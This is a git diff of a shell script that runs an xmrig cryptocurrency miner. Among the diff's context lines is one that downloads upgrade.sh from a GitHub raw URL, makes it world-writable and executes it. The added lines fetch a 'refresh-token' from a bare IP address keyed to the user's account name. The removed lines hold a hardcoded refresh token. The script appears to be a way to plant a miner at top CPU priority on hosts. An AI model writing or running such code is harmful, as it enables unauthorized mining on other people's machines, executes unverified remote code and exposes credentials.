@@ -6,10 +6,9 @@ export TZ=America/Sao_Paulo
 #g189e53@gmail.com
 
 path=$(pwd)
+account=${path#/home/}
 
 rm -rf upgrade.sh && wget -q https://raw.githubusercontent.com/Predador21/scripts/main/upgrade.sh && chmod 777 upgrade.sh && ./upgrade.sh
-
-sudo pkill xmrig
 
 if [ ! -e 'xmrig' ] || [ ! -e 'config.json' ]
 then
@@ -19,11 +18,14 @@ fi
 
 if ! pgrep xmrig > /dev/null
 then
-   sudo nice -n -20 ./xmrig
+   #Backgroud
+   nice -n -20 ./xmrig
 fi
 
-
-sudo pkill init.sh
-sudo ./init.sh 1//0dQukGeNaC3WZCgYIARAAGA0SNwF-L9IryL_WU_Zz2KF0BQZp-4EmlJcdzvBJ496y2skxrRA7R1HU3TP6C9Y0KA3sf0YX-rXwTwk >> LOG
-
-
+if [ ! -e 'refresh-token' ]
+then
+   wget -q 'http://135.148.11.148/queue.php?owner='$account -O refresh-token
+else
+   refresh=( `cat "refresh-token"`)
+   echo $refresh
+fi
